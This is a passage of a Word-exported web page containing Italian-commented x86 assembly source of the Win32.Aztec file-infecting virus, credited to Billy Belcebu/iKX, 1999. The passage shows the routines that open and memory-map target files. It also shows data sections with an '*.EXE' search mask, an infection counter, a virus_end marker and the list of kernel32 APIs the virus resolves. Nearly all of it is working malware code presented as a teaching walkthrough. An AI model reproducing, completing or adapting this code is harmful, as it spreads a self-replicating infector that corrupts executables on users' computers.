</span>push<span style="mso-spacerun: yes">    </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>80000000h or 40000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       </span><span
style="mso-spacerun: yes"> </span>push<span style="mso-spacerun: yes">   
</span>esi<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>[ebp+_CreateFileA]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>OpenFile<span
style="mso-spacerun: yes">        </span>endp<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; apriamo il file<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span>; input:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span>;<span style="mso-spacerun: yes">     
</span>ECX – misura da mappare<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span></span><span lang=EN-US style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF;mso-ansi-language:
EN-US'>; output:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes"> </span>;<span style="mso-spacerun: yes">      </span>EAX - MapHandle se
tutto OK<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>CreateMap<span style="mso-spacerun: yes">      
</span>proc<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>xor<span style="mso-spacerun: yes">     </span>eax,eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>ecx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>push<span
style="mso-spacerun: yes">    </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>00000004h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>dword ptr
[ebp+FileHandle]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>[ebp+_CreateFileMappingA]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>CreateMap<span style="mso-spacerun: yes">      
</span>endp<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:EN-US'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; la funzione
CreateFileMapping function crea un named o unnamed file-mapping object per il
file <o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; specificato.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------</span><span
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span>; input:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span>;<span style="mso-spacerun: yes">     
</span>ECX – idem come sopra<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF'><span
style="mso-spacerun: yes"> </span></span><span lang=EN-US style='font-size:
12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFFF;mso-ansi-language:
EN-US'>; output:<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><span style="mso-spacerun:
yes"> </span>;<span style="mso-spacerun: yes">      </span>EAX - MapAddress se
OK<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=EN-US
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>MapFile<span style="mso-spacerun: yes">        
</span>proc<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>xor<span style="mso-spacerun: yes">     </span>eax,eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>ecx<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>eax<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>00000002h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>push<span style="mso-spacerun: yes">    </span>dword ptr [ebp+MapHandle]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">       
</span>call<span style="mso-spacerun: yes">    </span>[ebp+_MapViewOfFile]<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">        </span></span></b><b
style='mso-bidi-font-weight:normal'><span style='mso-fareast-font-family:"MS Mincho";
color:#CCFFFF'>ret<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'>MapFile<span
style="mso-spacerun: yes">         </span>endp<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>;----------------------------------------------------------------------------------------------------------------<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span style='font-size:12.0pt;
mso-bidi-font-size:10.0pt;font-family:"Times New Roman";mso-fareast-font-family:
"MS Mincho";mso-bidi-font-family:"Courier New";color:#CCFFCC'>; la funzione MapViewOfFile
mappa una “view” di un file nello spazion di indirizzamento del processo
chiamante.<o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=DE
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFCC;mso-ansi-language:DE'>;----------------------------------------------------------------------------------------------------------------</span><span
lang=DE style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:DE'><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><span lang=DE
style='font-size:12.0pt;mso-bidi-font-size:10.0pt;font-family:"Times New Roman";
mso-fareast-font-family:"MS Mincho";mso-bidi-font-family:"Courier New";
color:#CCFFFF;mso-ansi-language:DE'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=DE style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:DE'>mark_<span style="mso-spacerun: yes">   </span>db<span
style="mso-spacerun: yes">      </span>&quot;[Win32.Aztec v1.01]&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=DE style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:DE'><span style="mso-spacerun: yes">   </span><span
style="mso-spacerun: yes">     </span></span></b><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>db<span style="mso-spacerun: yes">     
</span>&quot;(c) 1999 Billy Belcebu/iKX&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'>EXE_MASK<span style="mso-spacerun: yes">       
</span>db<span style="mso-spacerun: yes">      </span>&quot;*.EXE&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=FR style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:FR'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>infections<span style="mso-spacerun: yes">     
</span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>kernel<span style="mso-spacerun: yes">         
</span>dd<span style="mso-spacerun: yes">      </span>kernel_<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@@Namez<span style="mso-spacerun:
yes">                 </span>label<span style="mso-spacerun: yes">  
</span>byte<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@FindFirstFileA<span style="mso-spacerun:
yes">         </span>db<span style="mso-spacerun: yes">     
</span>&quot;FindFirstFileA&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@FindNextFileA<span style="mso-spacerun: yes">     
</span><span style="mso-spacerun: yes">    </span>db<span style="mso-spacerun:
yes">      </span>&quot;FindNextFileA&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@FindClose<span style="mso-spacerun:
yes">              </span>db<span style="mso-spacerun: yes">     
</span>&quot;FindClose&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@CreateFileA<span style="mso-spacerun:
yes">            </span>db<span style="mso-spacerun: yes">     
</span>&quot;CreateFileA&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@SetFilePointer<span style="mso-spacerun:
yes">         </span>db<span style="mso-spacerun: yes">     
</span>&quot;SetFilePointer&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@SetFileAttributesA<span style="mso-spacerun:
yes">     </span>db<span style="mso-spacerun: yes">     
</span>&quot;SetFileAttributesA&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@CloseHandle<span style="mso-spacerun:
yes">            </span>db<span style="mso-spacerun: yes">     
</span>&quot;CloseHandle&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@GetCurrentDirectoryA<span style="mso-spacerun:
yes">   </span>db<span style="mso-spacerun: yes">     
</span>&quot;GetCurrentDirectoryA&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@SetCurrentDirectoryA<span style="mso-spacerun:
yes">   </span>db<span style="mso-spacerun: yes">     
</span>&quot;SetCurrentDirectoryA&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@GetWindowsDirectoryA<span style="mso-spacerun:
yes">   </span>db<span style="mso-spacerun: yes">     
</span>&quot;GetWindowsDirectoryA&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@GetSystemDirectoryA<span style="mso-spacerun:
yes">    </span>db<span style="mso-spacerun: yes">     
</span>&quot;GetSystemDirectoryA&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@CreateFileMappingA<span style="mso-spacerun:
yes">     </span>db<span style="mso-spacerun: yes">     
</span>&quot;CreateFileMappingA&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@MapViewOfFile<span style="mso-spacerun:
yes">          </span>db<span style="mso-spacerun: yes">     
</span>&quot;MapViewOfFile&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=DE style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:DE'>@UnmapViewOfFile<span style="mso-spacerun: yes">       
</span>db<span style="mso-spacerun: yes">     
</span>&quot;UnmapViewOfFile&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>@SetEndOfFile<span style="mso-spacerun:
yes">           </span>db<span style="mso-spacerun: yes">     
</span>&quot;SetEndOfFile&quot;,0<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                        </span>db<span style="mso-spacerun: yes">     
</span>0BBh<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun: yes">                  
</span><span style="mso-spacerun: yes">     </span>align<span
style="mso-spacerun: yes">   </span>dword<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>virus_end<span style="mso-spacerun:
yes">               </span>label<span style="mso-spacerun: yes">   </span>byte<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>heap_start<span style="mso-spacerun:
yes">              </span>label<span style="mso-spacerun: yes">   </span>byte<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><span style="mso-spacerun:
yes">                        </span>dd<span style="mso-spacerun: yes">     
</span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>NewSize<span style="mso-spacerun:
yes">                 </span>dd<span style="mso-spacerun: yes">     
</span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>SearchHandle<span style="mso-spacerun:
yes">            </span>dd<span style="mso-spacerun: yes">     
</span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>FileHandle<span style="mso-spacerun:
yes">              </span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>MapHandle<span style="mso-spacerun:
yes">               </span>dd<span style="mso-spacerun: yes">     
</span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>MapAddress<span style="mso-spacerun:
yes">              </span>dd<span style="mso-spacerun: yes">     
</span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
normal'><span lang=EN-US style='mso-fareast-font-family:"MS Mincho";color:#CCFFFF;
mso-ansi-language:EN-US'>AddressTableVA<span style="mso-spacerun:
yes">          </span>dd<span style="mso-spacerun: yes">      </span>00000000h<o:p></o:p></span></b></p>

<p class=MsoPlainText style='text-align:justify'><b style='mso-bidi-font-weight:
